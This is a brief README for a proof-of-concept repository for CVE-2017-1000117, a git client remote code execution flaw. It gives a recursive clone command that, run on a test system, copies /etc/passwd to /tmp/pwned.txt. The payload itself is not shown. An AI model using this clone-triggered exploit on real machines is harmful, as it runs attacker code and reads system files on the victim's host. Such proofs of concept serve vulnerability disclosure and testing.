# git-client-rce

Test GIT Repo for git-client-rce PoC ( CVE-2017-1000117 )

https://marc.info/?l=git&m=150238802328673&w=2

This CVE affects all the git clients 

Execute following on test system to see PoC :

$git clone --recursive https://github.com/thelastbyte/git-client-rce.gi

Successful execution will result in copying content of /etc/passwd to /tmp/pwned.txt
